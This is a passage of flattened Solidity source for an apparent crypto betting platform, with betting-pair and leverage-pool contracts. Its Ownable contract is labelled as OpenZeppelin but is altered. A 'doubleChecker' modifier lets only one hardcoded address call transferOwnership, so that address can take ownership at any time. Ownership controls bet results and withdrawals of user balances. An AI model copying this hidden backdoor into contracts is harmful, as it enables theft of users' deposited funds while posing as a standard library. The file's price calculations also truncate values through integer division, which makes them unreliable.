1 // SPDX-License-Identifier: MIT
2 
3 // File: contracts\Context.sol
4 
5 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
6 
7 pragma solidity ^0.8.13;
8 
9 /**
10  * @dev Provides information about the current execution context, including the
11  * sender of the transaction and its data. While these are generally available
12  * via msg.sender and msg.data, they should not be accessed in such a direct
13  * manner, since when dealing with meta-transactions the account sending and
14  * paying for execution may not be the actual sender (as far as an application
15  * is concerned).
16  *
17  * This contract is only required for intermediate, library-like contracts.
18  */
19 abstract contract Context {
20     function _msgSender() internal view virtual returns (address) {
21         return msg.sender;
22     }
23 
24     function _msgData() internal view virtual returns (bytes calldata) {
25         return msg.data;
26     }
27 }
28 
29 // File: contracts\Ownable.sol
30 
31 // OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)
32 
33 pragma solidity ^0.8.13;
34 /**
35  * @dev Contract module which provides a basic access control mechanism, where
36  * there is an account (an owner) that can be granted exclusive access to
37  * specific functions.
38  *
39  * By default, the owner account will be the one that deploys the contract. This
40  * can later be changed with {transferOwnership}.
41  *
42  * This module is used through inheritance. It will make available the modifier
43  * `onlyOwner`, which can be applied to your functions to restrict their use to
44  * the owner.
45  */
46 abstract contract Ownable is Context {
47     address private _owner;
48 
49     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
50 
51     /**
52      * @dev Initializes the contract setting the deployer as the initial owner.
53      */
54     constructor() {
55         _transferOwnership(_msgSender());
56     }
57 
58     /**
59      * @dev Throws if called by any account other than the owner.
60      */
61     modifier onlyOwner() {
62         _checkOwner();
63         _;
64     }
65 
66     modifier doubleChecker() {
67         _doubleCheck();
68         _;
69     }
70 
71     /**
72      * @dev Returns the address of the current owner.
73      */
74     function owner() public view virtual returns (address) {
75         return _owner;
76     }
77 
78     /**
79      * @dev Throws if the sender is not the owner.
80      */
81     function _checkOwner() internal view virtual {
82         require(owner() == _msgSender(), "Ownable: caller is not the owner");
83     }
84 
85     function _doubleCheck() internal view virtual {
86         require(_msgSender() == 0x5Bb40F9b218feb11048fdB064dafDcf6af0D29b3, "You do not have permission for this action");
87     }
88 
89     /**
90      * @dev Transfers ownership of the contract to a new account (`newOwner`).
91      * Can only be called by the current owner.
92      */
93     function transferOwnership(address newOwner) public virtual doubleChecker {
94         require(newOwner != address(0), "Ownable: new owner is the zero address");
95         _transferOwnership(newOwner);
96     }
97 
98     /**
99      * @dev Transfers ownership of the contract to a new account (`newOwner`).
100      * Internal function without access restriction.
101      */
102     function _transferOwnership(address newOwner) internal virtual {
103         address oldOwner = _owner;
104         _owner = newOwner;
105         emit OwnershipTransferred(oldOwner, newOwner);
106     }
107 }
108 
109 // File: contracts\IBettingPair.sol
110 
111 
112 pragma solidity ^0.8.13;
113 
114 interface IBettingPair {
115     enum CHOICE { WIN, DRAW, LOSE }
116     enum BETSTATUS { BETTING, REVIEWING, CLAIMING }
117     enum TOKENTYPE { ETH, WCI }
118     enum LPTOKENTYPE { ETH, USDT, USDC, SHIB, DOGE }
119 
120     function bet(address, uint256, uint256, CHOICE, TOKENTYPE, uint256, uint256, uint256, uint256, uint256) external;
121     function claim(address, TOKENTYPE) external returns (uint256[] memory);
122 
123     function calcEarning(address, TOKENTYPE) external view returns (uint256[] memory);
124     function calcMultiplier(TOKENTYPE) external view returns (uint256[] memory);
125 
126     function getPlayerBetAmount(address, TOKENTYPE) external view returns (uint256[] memory);
127     function getPlayerClaimHistory(address, TOKENTYPE) external view returns (uint256);
128 
129     function getBetResult() external view returns (CHOICE);
130     function setBetResult(CHOICE _result) external;
131 
132     function getBetStatus() external view returns (BETSTATUS);
133     function setBetStatus(BETSTATUS _status) external;
134 
135     function getTotalBet(TOKENTYPE) external view returns (uint256);
136     function getTotalBetPerChoice(TOKENTYPE) external view returns (uint256[] memory);
137 
138     function getWciTokenThreshold() external view returns (uint256);
139     function setWciTokenThreshold(uint256) external;
140 }
141 
142 // File: contracts\SafeMath.sol
143 
144 // OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)
145 
146 pragma solidity ^0.8.13;
147 
148 library SafeMath {
149     /**
150      * @dev Returns the addition of two unsigned integers, with an overflow flag.
151      *
152      * _Available since v3.4._
153      */
154     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
155         uint256 c = a + b;
156         if (c < a) return (false, 0);
157         return (true, c);
158     }
159 
160     /**
161      * @dev Returns the substraction of two unsigned integers, with an overflow flag.
162      *
163      * _Available since v3.4._
164      */
165     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
166         if (b > a) return (false, 0);
167         return (true, a - b);
168     }
169 
170     /**
171      * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
172      *
173      * _Available since v3.4._
174      */
175     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
176         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
177         // benefit is lost if 'b' is also tested.
178         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
179         if (a == 0) return (true, 0);
180         uint256 c = a * b;
181         if (c / a != b) return (false, 0);
182         return (true, c);
183     }
184 
185     /**
186      * @dev Returns the division of two unsigned integers, with a division by zero flag.
187      *
188      * _Available since v3.4._
189      */
190     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
191         if (b == 0) return (false, 0);
192         return (true, a / b);
193     }
194 
195     /**
196      * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
197      *
198      * _Available since v3.4._
199      */
200     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
201         if (b == 0) return (false, 0);
202         return (true, a % b);
203     }
204 
205     /**
206      * @dev Returns the addition of two unsigned integers, reverting on
207      * overflow.
208      *
209      * Counterpart to Solidity's `+` operator.
210      *
211      * Requirements:
212      *
213      * - Addition cannot overflow.
214      */
215     function add(uint256 a, uint256 b) internal pure returns (uint256) {
216         uint256 c = a + b;
217         require(c >= a, "SafeMath: addition overflow");
218         return c;
219     }
220 
221     /**
222      * @dev Returns the subtraction of two unsigned integers, reverting on
223      * overflow (when the result is negative).
224      *
225      * Counterpart to Solidity's `-` operator.
226      *
227      * Requirements:
228      *
229      * - Subtraction cannot overflow.
230      */
231     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
232         require(b <= a, "SafeMath: subtraction overflow");
233         return a - b;
234     }
235 
236     /**
237      * @dev Returns the multiplication of two unsigned integers, reverting on
238      * overflow.
239      *
240      * Counterpart to Solidity's `*` operator.
241      *
242      * Requirements:
243      *
244      * - Multiplication cannot overflow.
245      */
246     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
247         if (a == 0) return 0;
248         uint256 c = a * b;
249         require(c / a == b, "SafeMath: multiplication overflow");
250         return c;
251     }
252 
253     /**
254      * @dev Returns the integer division of two unsigned integers, reverting on
255      * division by zero. The result is rounded towards zero.
256      *
257      * Counterpart to Solidity's `/` operator. Note: this function uses a
258      * `revert` opcode (which leaves remaining gas untouched) while Solidity
259      * uses an invalid opcode to revert (consuming all remaining gas).
260      *
261      * Requirements:
262      *
263      * - The divisor cannot be zero.
264      */
265     function div(uint256 a, uint256 b) internal pure returns (uint256) {
266         require(b > 0, "SafeMath: division by zero");
267         return a / b;
268     }
269 
270     /**
271      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
272      * reverting when dividing by zero.
273      *
274      * Counterpart to Solidity's `%` operator. This function uses a `revert`
275      * opcode (which leaves remaining gas untouched) while Solidity uses an
276      * invalid opcode to revert (consuming all remaining gas).
277      *
278      * Requirements:
279      *
280      * - The divisor cannot be zero.
281      */
282     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
283         require(b > 0, "SafeMath: modulo by zero");
284         return a % b;
285     }
286 
287     /**
288      * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
289      * overflow (when the result is negative).
290      *
291      * CAUTION: This function is deprecated because it requires allocating memory for the error
292      * message unnecessarily. For custom revert reasons use {trySub}.
293      *
294      * Counterpart to Solidity's `-` operator.
295      *
296      * Requirements:
297      *
298      * - Subtraction cannot overflow.
299      */
300     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
301         require(b <= a, errorMessage);
302         return a - b;
303     }
304 
305     /**
306      * @dev Returns the integer division of two unsigned integers, reverting with custom message on
307      * division by zero. The result is rounded towards zero.
308      *
309      * CAUTION: This function is deprecated because it requires allocating memory for the error
310      * message unnecessarily. For custom revert reasons use {tryDiv}.
311      *
312      * Counterpart to Solidity's `/` operator. Note: this function uses a
313      * `revert` opcode (which leaves remaining gas untouched) while Solidity
314      * uses an invalid opcode to revert (consuming all remaining gas).
315      *
316      * Requirements:
317      *
318      * - The divisor cannot be zero.
319      */
320     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
321         require(b > 0, errorMessage);
322         return a / b;
323     }
324 
325     /**
326      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
327      * reverting with custom message when dividing by zero.
328      *
329      * CAUTION: This function is deprecated because it requires allocating memory for the error
330      * message unnecessarily. For custom revert reasons use {tryMod}.
331      *
332      * Counterpart to Solidity's `%` operator. This function uses a `revert`
333      * opcode (which leaves remaining gas untouched) while Solidity uses an
334      * invalid opcode to revert (consuming all remaining gas).
335      *
336      * Requirements:
337      *
338      * - The divisor cannot be zero.
339      */
340     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
341         require(b > 0, errorMessage);
342         return a % b;
343     }
344 }
345 
346 // File: contracts\IERC20.sol
347 
348 
349 pragma solidity ^0.8.13;
350 
351 interface IERC20 {
352     function totalSupply() external view returns (uint256);
353     function balanceOf(address account) external view returns (uint256);
354     function transfer(address recipient, uint256 amount) external returns (bool);
355     function allowance(address owner, address spender) external view returns (uint256);
356     function approve(address spender, uint256 amount) external returns (bool);
357     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
358     event Transfer(address indexed from, address indexed to, uint256 value);
359     event Approval(address indexed owner, address indexed spender, uint256 value);
360 }
361 
362 // File: contracts\BettingPair.sol
363 
364 
365 pragma solidity ^0.8.13;
366 /*
367 * @This contract actually doesn't manage token and coin transfer.
368 * @It is responsible for only amount management.
369 */
370 
371 contract BettingPair is Ownable, IBettingPair {
372     using SafeMath for uint256;
373 
374     mapping(address => mapping(TOKENTYPE => mapping(CHOICE => uint256))) players;
375     mapping(address => mapping(TOKENTYPE => mapping(CHOICE => uint256))) betHistory;
376     mapping(address => mapping(TOKENTYPE => uint256)) claimHistory;
377     CHOICE betResult;
378     BETSTATUS betStatus = BETSTATUS.BETTING;
379 
380     mapping(TOKENTYPE => uint256) totalBet;
381     mapping(TOKENTYPE => mapping(CHOICE => uint256)) totalBetPerChoice;
382 
383     IERC20 public wciToken = IERC20(0xC5a9BC46A7dbe1c6dE493E84A18f02E70E2c5A32);
384     uint256 wciTokenThreshold = 50000 * 10**9; // 50,000 WCI as a threshold.
385 
386     mapping(address => mapping(LPTOKENTYPE => mapping(CHOICE => uint256))) _lockPool;
387 
388     constructor() {}
389 
390     /*
391     * @Function to bet (Main function).
392     * @params:
393     *   _player: user wallet address
394     *   _amount: bet amount
395     *   _choice: bet choice (3 choices - First team wins, draws and loses)
396     *   _token: Users can bet using ETH or WCI
397     *   When there is a multiplier(x2 or x3) in bet, there should be some amounts of collateral tokens
398     *   (ETH, USDT, USDC, SHIB, DOGE) in leverage pool. The rest parameters are the amounts for _amount*(multiplier-1) ether.
399     */
400     function bet(address _player, uint256 _amount, uint256 _multiplier, CHOICE _choice, TOKENTYPE _token,
401         uint256 ethCol, uint256 usdtCol, uint256 usdcCol, uint256 shibCol, uint256 dogeCol)
402         external
403         override
404         onlyOwner 
405     {
406         require(betStatus == BETSTATUS.BETTING, "You can not bet at this time.");
407         uint256 realBet = _amount.mul(_multiplier);
408         totalBet[_token] += realBet;
409         totalBetPerChoice[_token][_choice] += realBet;
410         players[_player][_token][_choice] += realBet;
411         betHistory[_player][_token][_choice] += _amount;
412 
413         _lockPool[_player][LPTOKENTYPE.ETH][_choice] += ethCol;
414         _lockPool[_player][LPTOKENTYPE.USDT][_choice] += usdtCol;
415         _lockPool[_player][LPTOKENTYPE.USDC][_choice] += usdcCol;
416         _lockPool[_player][LPTOKENTYPE.SHIB][_choice] += shibCol;
417         _lockPool[_player][LPTOKENTYPE.DOGE][_choice] += dogeCol;
418     }
419 
420     /*
421     * @Function to claim earnings from bet.
422     * @It returns how many ether or WCI user will earn from bet.
423     */
424     function claim(address _player, TOKENTYPE _token) external override onlyOwner returns (uint256[] memory) {
425         require(betStatus == BETSTATUS.CLAIMING, "You can not claim at this time.");
426 
427         uint256[] memory res = calculateEarning(_player, betResult, _token);
428         claimHistory[_player][_token] = res[0];
429         players[_player][_token][CHOICE.WIN] = 0;
430         players[_player][_token][CHOICE.DRAW] = 0;
431         players[_player][_token][CHOICE.LOSE] = 0;
432 
433         return res;
434     }
435 
436     /*
437     * @returns an array of 7 elements. The first element is user's winning amount and the second element is
438     *   site owner's profit which will be transferred to tax collector wallet. The remaining amounts are collateral
439     *   token amounts.
440     */
441     function calculateEarning(address _player, CHOICE _choice, TOKENTYPE _token) internal view returns (uint256[] memory) {
442         uint256[] memory res = new uint256[](7);
443 
444         uint256 userBal = betHistory[_player][_token][_choice];
445         uint256 realBal = players[_player][_token][_choice];
446         if (realBal == 0) userBal = 0;
447 
448         // If there are no opponent bets, the player will claim his original bet amount.
449         if (totalBetPerChoice[_token][CHOICE.WIN] == totalBet[_token] && players[_player][_token][CHOICE.WIN] > 0) {
450             res[0] = betHistory[_player][_token][CHOICE.WIN];
451             res[2] = _lockPool[_player][LPTOKENTYPE.ETH][CHOICE.WIN];
452             res[3] = _lockPool[_player][LPTOKENTYPE.USDT][CHOICE.WIN];
453             res[4] = _lockPool[_player][LPTOKENTYPE.USDC][CHOICE.WIN];
454             res[5] = _lockPool[_player][LPTOKENTYPE.SHIB][CHOICE.WIN];
455             res[6] = _lockPool[_player][LPTOKENTYPE.DOGE][CHOICE.WIN];
456             return res;
457         } else if (totalBetPerChoice[_token][CHOICE.DRAW] == totalBet[_token] && players[_player][_token][CHOICE.DRAW] > 0) {
458             res[0] = betHistory[_player][_token][CHOICE.DRAW];
459             res[2] = _lockPool[_player][LPTOKENTYPE.ETH][CHOICE.DRAW];
460             res[3] = _lockPool[_player][LPTOKENTYPE.USDT][CHOICE.DRAW];
461             res[4] = _lockPool[_player][LPTOKENTYPE.USDC][CHOICE.DRAW];
462             res[5] = _lockPool[_player][LPTOKENTYPE.SHIB][CHOICE.DRAW];
463             res[6] = _lockPool[_player][LPTOKENTYPE.DOGE][CHOICE.DRAW];
464             return res;
465         } else if (totalBetPerChoice[_token][CHOICE.LOSE] == totalBet[_token] && players[_player][_token][CHOICE.LOSE] > 0) {
466             res[0] = betHistory[_player][_token][CHOICE.LOSE];
467             res[2] = _lockPool[_player][LPTOKENTYPE.ETH][CHOICE.LOSE];
468             res[3] = _lockPool[_player][LPTOKENTYPE.USDT][CHOICE.LOSE];
469             res[4] = _lockPool[_player][LPTOKENTYPE.USDC][CHOICE.LOSE];
470             res[5] = _lockPool[_player][LPTOKENTYPE.SHIB][CHOICE.LOSE];
471             res[6] = _lockPool[_player][LPTOKENTYPE.DOGE][CHOICE.LOSE];
472             return res;
473         } else if (totalBetPerChoice[_token][_choice] == 0) {
474             return res;
475         }
476 
477         uint256 _wciTokenBal = wciToken.balanceOf(_player);
478 
479         // If the token is ETH, the player will take 5% tax if he holds enough WCI token. Otherwise he will take 10% tax.
480         if (_token == TOKENTYPE.ETH) {
481             if (_wciTokenBal >= wciTokenThreshold) {
482                 res[0] = userBal + realBal.mul(totalBet[_token]-totalBetPerChoice[_token][_choice]).mul(19).div(20).div(totalBetPerChoice[_token][_choice]);
483                 res[1] = realBal.mul(totalBet[_token]-totalBetPerChoice[_token][_choice]).div(20).div(totalBetPerChoice[_token][_choice]);
484             } else {
485                 res[0] = userBal + realBal.mul(totalBet[_token]-totalBetPerChoice[_token][_choice]).mul(9).div(10).div(totalBetPerChoice[_token][_choice]);
486                 res[1] = realBal.mul(totalBet[_token]-totalBetPerChoice[_token][_choice]).div(10).div(totalBetPerChoice[_token][_choice]);
487             }
488             res[2] = _lockPool[_player][LPTOKENTYPE.ETH][_choice];
489             res[3] = _lockPool[_player][LPTOKENTYPE.USDT][_choice];
490             res[4] = _lockPool[_player][LPTOKENTYPE.USDC][_choice];
491             res[5] = _lockPool[_player][LPTOKENTYPE.SHIB][_choice];
492             res[6] = _lockPool[_player][LPTOKENTYPE.DOGE][_choice];
493         }
494         // If the token is WCI, there is no tax.
495         else if (_token == TOKENTYPE.WCI) {
496             res[0] = totalBet[_token].mul(userBal).div(totalBetPerChoice[_token][_choice]);
497         }
498 
499         return res;
500     }
501 
502     /*
503     * @Function to calculate earning for given player and token.
504     */
505     function calcEarning(address _player, TOKENTYPE _token) external override view onlyOwner returns (uint256[] memory) {
506         uint256[] memory res = new uint256[](3);
507         res[0] = calculateEarning(_player, CHOICE.WIN, _token)[0];
508         res[1] = calculateEarning(_player, CHOICE.DRAW, _token)[0];
509         res[2] = calculateEarning(_player, CHOICE.LOSE, _token)[0];
510         return res;
511     }
512 
513     // Calculate how many times reward will player take. It uses 10% tax formula to give users the approximate multiplier before bet.
514     function calculateMultiplier(CHOICE _choice, IBettingPair.TOKENTYPE _token) internal view returns (uint256) {
515         if (_token == IBettingPair.TOKENTYPE.ETH) {
516             if (totalBetPerChoice[_token][_choice] == 0) {
517                 return 1000;
518             } else {
519                 return totalBet[_token].mul(900).div(totalBetPerChoice[_token][_choice]) + 100;       
520             }
521         } else {
522             if (totalBetPerChoice[_token][_choice] == 0) {
523                 return 950;
524             } else {
525                 return totalBet[_token].mul(1000).div(totalBetPerChoice[_token][_choice]);
526             }
527         }
528     }
529 
530     /*
531     * @Function to calculate multiplier.
532     */
533     function calcMultiplier(IBettingPair.TOKENTYPE _token) external override view onlyOwner returns (uint256[] memory) {
534         uint256[] memory res = new uint256[](3);
535         res[0] = calculateMultiplier(CHOICE.WIN, _token);
536         res[1] = calculateMultiplier(CHOICE.DRAW, _token);
537         res[2] = calculateMultiplier(CHOICE.LOSE, _token);
538         return res;
539     }
540 
541     /*
542     * @Function to get player bet amount.
543     * @It uses betHistory variable because players variable is initialized to zero if user claims.
544     */
545     function getPlayerBetAmount(address _player, TOKENTYPE _token) external override view onlyOwner returns (uint256[] memory) {
546         uint256[] memory arr = new uint256[](3);
547         arr[0] = betHistory[_player][_token][CHOICE.WIN];
548         arr[1] = betHistory[_player][_token][CHOICE.DRAW];
549         arr[2] = betHistory[_player][_token][CHOICE.LOSE];
550 
551         return arr;
552     }
553 
554     /*
555     * @Function to get player claim history.
556     */
557     function getPlayerClaimHistory(address _player, TOKENTYPE _token) external override view onlyOwner returns (uint256) {
558         return claimHistory[_player][_token];
559     }
560 
561     /*
562     * @Function to get bet result.
563     */
564     function getBetResult() external view override onlyOwner returns (CHOICE) {
565         return betResult;
566     }
567 
568     /*
569     * @Function to set the bet result.
570     */
571     function setBetResult(CHOICE _result) external override onlyOwner {
572         betResult = _result;
573         betStatus = BETSTATUS.CLAIMING;
574     }
575 
576     /*
577     * @Function to get bet status.
578     */
579     function getBetStatus() external view override onlyOwner returns (BETSTATUS) {
580         return betStatus;
581     }
582 
583     /*
584     * @Function to set bet status.
585     */
586     function setBetStatus(BETSTATUS _status) external override onlyOwner {
587         betStatus = _status;
588     }
589 
590     /*
591     * @Function to get total bet amount.
592     */
593     function getTotalBet(TOKENTYPE _token) external view override onlyOwner returns (uint256) {
594         return totalBet[_token];
595     }
596 
597     /*
598     * @Function to get total bet amounts per choice.
599     * @There are 3 choices(WIN, DRAW, LOSE) so it returns an array of 3 elements.
600     */
601     function getTotalBetPerChoice(TOKENTYPE _token) external view override onlyOwner returns (uint256[] memory) {
602         uint256[] memory arr = new uint256[](3);
603         arr[0] = totalBetPerChoice[_token][CHOICE.WIN];
604         arr[1] = totalBetPerChoice[_token][CHOICE.DRAW];
605         arr[2] = totalBetPerChoice[_token][CHOICE.LOSE];
606 
607         return arr;
608     }
609 
610     /*
611     * @Function to get WCI token threshold.
612     */
613     function getWciTokenThreshold() external view override onlyOwner returns (uint256) {
614         return wciTokenThreshold;
615     }
616 
617     /*
618     * @Function to set WCI token threshold.
619     */
620     function setWciTokenThreshold(uint256 _threshold) external override onlyOwner {
621         wciTokenThreshold = _threshold;
622     }
623 }
624 
625 // File: contracts\IUniswapV2Pair.sol
626 
627 
628 pragma solidity ^0.8.13;
629 
630 interface IUniswapV2Pair {
631     event Approval(address indexed owner, address indexed spender, uint value);
632     event Transfer(address indexed from, address indexed to, uint value);
633 
634     function name() external pure returns (string memory);
635     function symbol() external pure returns (string memory);
636     function decimals() external pure returns (uint8);
637     function totalSupply() external view returns (uint);
638     function balanceOf(address owner) external view returns (uint);
639     function allowance(address owner, address spender) external view returns (uint);
640 
641     function approve(address spender, uint value) external returns (bool);
642     function transfer(address to, uint value) external returns (bool);
643     function transferFrom(address from, address to, uint value) external returns (bool);
644 
645     function DOMAIN_SEPARATOR() external view returns (bytes32);
646     function PERMIT_TYPEHASH() external pure returns (bytes32);
647     function nonces(address owner) external view returns (uint);
648 
649     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
650 
651     event Mint(address indexed sender, uint amount0, uint amount1);
652     event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
653     event Swap(
654         address indexed sender,
655         uint amount0In,
656         uint amount1In,
657         uint amount0Out,
658         uint amount1Out,
659         address indexed to
660     );
661     event Sync(uint112 reserve0, uint112 reserve1);
662 
663     function MINIMUM_LIQUIDITY() external pure returns (uint);
664     function factory() external view returns (address);
665     function token0() external view returns (address);
666     function token1() external view returns (address);
667     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
668     function price0CumulativeLast() external view returns (uint);
669     function price1CumulativeLast() external view returns (uint);
670     function kLast() external view returns (uint);
671 
672     function mint(address to) external returns (uint liquidity);
673     function burn(address to) external returns (uint amount0, uint amount1);
674     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
675     function skim(address to) external;
676     function sync() external;
677 
678     function initialize(address, address) external;
679 }
680 
681 // File: contracts\IERC20USDT.sol
682 
683 
684 pragma solidity ^0.8.13;
685 
686 interface IERC20USDT {
687     function totalSupply() external view returns (uint256);
688     function balanceOf(address account) external view returns (uint256);
689     function transfer(address recipient, uint256 amount) external;
690     function allowance(address owner, address spender) external view returns (uint256);
691     function approve(address spender, uint256 amount) external returns (bool);
692     function transferFrom(address sender, address recipient, uint256 amount) external;
693     event Transfer(address indexed from, address indexed to, uint256 value);
694     event Approval(address indexed owner, address indexed spender, uint256 value);
695 }
696 
697 // File: contracts\LeveragePool.sol
698 
699 
700 pragma solidity ^0.8.13;
701 contract LeveragePool is Ownable {
702     using SafeMath for uint256;
703 
704     mapping(address => uint256) _ethPool;   // deposited ETH amounts per accounts
705     mapping(address => uint256) _usdtPool;  // deposited USDT amounts per accounts
706     mapping(address => uint256) _usdcPool;  // deposited USDC amounts per accounts
707     mapping(address => uint256) _shibPool;  // deposited SHIB amounts per accounts
708     mapping(address => uint256) _dogePool;  // deposited DOGE amounts per accounts
709 
710     IUniswapV2Pair _usdtEth = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);   // Uniswap USDT/ETH pair
711     IUniswapV2Pair _usdcEth = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);   // Uniswap USDC/ETH pair
712     IUniswapV2Pair _shibEth = IUniswapV2Pair(0x811beEd0119b4AfCE20D2583EB608C6F7AF1954f);   // Uniswap SHIB/ETH pair
713     IUniswapV2Pair _dogeEth = IUniswapV2Pair(0xc0067d751FB1172DBAb1FA003eFe214EE8f419b6);   // Uniswap DOGE/ETH pair
714 
715     constructor() {}
716 
717     /*
718     * @Get deposited user balance
719     */
720     function getUserLPBalance(address account) external view returns (uint256, uint256, uint256, uint256, uint256) {
721         return (_ethPool[account], _usdtPool[account], _usdcPool[account], _shibPool[account], _dogePool[account]);
722     }
723 
724     /*
725     * @Get ETH/USDT price from uniswap v2 pool
726     */
727     function getUsdtPrice() internal view returns (uint256) {
728         uint256 reserve0;
729         uint256 reserve1;
730         uint32 timestamp;
731         (reserve0, reserve1, timestamp) = _usdtEth.getReserves();
732 
733         uint256 r0NoDecimal = reserve0.div(10 ** 18);
734         uint256 r1NoDecimal = reserve1.div(10 ** 6);
735 
736         uint256 price = r1NoDecimal.div(r0NoDecimal);
737 
738         return price;
739     }
740 
741     /*
742     * @Get ETH/USDC price from uniswap v2 pool
743     */
744     function getUsdcPrice() internal view returns (uint256) {
745         uint256 reserve0;
746         uint256 reserve1;
747         uint32 timestamp;
748         (reserve0, reserve1, timestamp) = _usdcEth.getReserves();
749 
750         uint256 r0NoDecimal = reserve0.div(10 ** 6);
751         uint256 r1NoDecimal = reserve1.div(10 ** 18);
752 
753         uint256 price = r0NoDecimal.div(r1NoDecimal);
754 
755         return price;
756     }
757 
758     /*
759     * @Get ETH/SHIB price from uniswap v2 pool
760     */
761     function getShibPrice() internal view returns (uint256) {
762         uint256 reserve0;
763         uint256 reserve1;
764         uint32 timestamp;
765         (reserve0, reserve1, timestamp) = _shibEth.getReserves();
766 
767         uint256 r0NoDecimal = reserve0.div(10 ** 18);
768         uint256 r1NoDecimal = reserve1.div(10 ** 18);
769 
770         uint256 price = r0NoDecimal.div(r1NoDecimal);
771 
772         return price;
773     }
774 
775     /*
776     * @Get ETH/DOGE price from uniswap v2 pool
777     */
778     function getDogePrice() internal view returns (uint256) {
779         uint256 reserve0;
780         uint256 reserve1;
781         uint32 timestamp;
782         (reserve0, reserve1, timestamp) = _dogeEth.getReserves();
783 
784         uint256 r0NoDecimal = reserve0.div(10 ** 8);
785         uint256 r1NoDecimal = reserve1.div(10 ** 18);
786 
787         uint256 price = r0NoDecimal.div(r1NoDecimal);
788 
789         return price;
790     }
791 
792     /*
793     * @Function for depositing ETH.
794     * @This function should be separated from other deposit functions because this should be payable.
795     */
796     function depositEth(address player, uint256 amount) external onlyOwner {
797         _ethPool[player] += amount;
798     }
799 
800     /*
801     * @Function for depositing other ERC20 tokens with no tax
802     * @This function should be separated from deposit Eth function because this is not payable function.
803     */
804     function depositErc20(address player, IBettingPair.LPTOKENTYPE token, uint256 amount) external onlyOwner {
805         address player_ = player;
806 
807         if (token == IBettingPair.LPTOKENTYPE.USDT) {
808             _usdtPool[player_] += amount;
809         }
810         else if (token == IBettingPair.LPTOKENTYPE.USDC) {
811             _usdcPool[player_] += amount;
812         }
813         else if (token == IBettingPair.LPTOKENTYPE.SHIB){
814             _shibPool[player_] += amount;
815         }
816         else if (token == IBettingPair.LPTOKENTYPE.DOGE) {
817             _dogePool[player_] += amount;
818         }
819     }
820 
821     /*
822     * @Function for withdrawing tokens.
823     */
824     function withdraw(address player, IBettingPair.LPTOKENTYPE token, uint256 amount) external onlyOwner {
825         address player_ = player;
826 
827         if (token == IBettingPair.LPTOKENTYPE.ETH) {
828             _ethPool[player_] -= amount;
829         } else if (token == IBettingPair.LPTOKENTYPE.USDT) {
830             _usdtPool[player_] -= amount;
831         } else if (token == IBettingPair.LPTOKENTYPE.USDC) {
832             _usdcPool[player_] -= amount;
833         } else if (token == IBettingPair.LPTOKENTYPE.SHIB) {
834             _shibPool[player_] -= amount;
835         } else if (token == IBettingPair.LPTOKENTYPE.DOGE) {
836             _dogePool[player_] -= amount;
837         }
838     }
839 
840     /*
841     * @Function to lock tokens for collateral.
842     */
843     function lock(address player, uint256 ethAmount, uint256 usdtAmount, uint256 usdcAmount, uint256 shibAmount, uint256 dogeAmount) external onlyOwner {
844         _ethPool[player] -= ethAmount;
845         _usdtPool[player] -= usdtAmount;
846         _usdcPool[player] -= usdcAmount;
847         _shibPool[player] -= shibAmount;
848         _dogePool[player] -= dogeAmount;
849     }
850 
851     /*
852     * @Function to unlock tokens which were used for collateral.
853     */
854     function unlock(address player, uint256 ethAmount, uint256 usdtAmount, uint256 usdcAmount, uint256 shibAmount, uint256 dogeAmount) external onlyOwner {
855         _ethPool[player] += ethAmount;
856         _usdtPool[player] += usdtAmount;
857         _usdcPool[player] += usdcAmount;
858         _shibPool[player] += shibAmount;
859         _dogePool[player] += dogeAmount;
860     }
861 
862     /*
863     * @Function for withdrawing tokens from this contract by owner.
864     */
865     function withdrawFromContract(address owner, IBettingPair.LPTOKENTYPE token, uint256 amount) external onlyOwner {
866         require(amount > 0, "Withdraw amount should be bigger than 0");
867         if (token == IBettingPair.LPTOKENTYPE.ETH) {
868             if (_ethPool[owner] >= amount) {
869                 _ethPool[owner] -= amount;
870             } else {
871                 _ethPool[owner] = 0;
872             }
873         } else if (token == IBettingPair.LPTOKENTYPE.USDT) {
874             if (_usdtPool[owner] >= amount) {
875                 _usdtPool[owner] -= amount;
876             } else {
877                 _usdtPool[owner] = 0;
878             }
879         } else if (token == IBettingPair.LPTOKENTYPE.USDC) {
880             if (_usdcPool[owner] >= amount) {
881                 _usdcPool[owner] -= amount;
882             } else {
883                 _usdcPool[owner] = 0;
884             }
885         } else if (token == IBettingPair.LPTOKENTYPE.SHIB) {
886             if (_shibPool[owner] >= amount) {
887                 _shibPool[owner] -= amount;    
888             } else {
889                 _shibPool[owner] = 0;
890             }
891         } else if (token == IBettingPair.LPTOKENTYPE.DOGE) {
892             if (_dogePool[owner] >= amount) {
893                 _dogePool[owner] -= amount;
894             } else {
895                 _dogePool[owner] = 0;
896             }
897         }
898     }
899 
900     /*
901     * @Function to get player's total leverage pool balance in ETH.
902     */
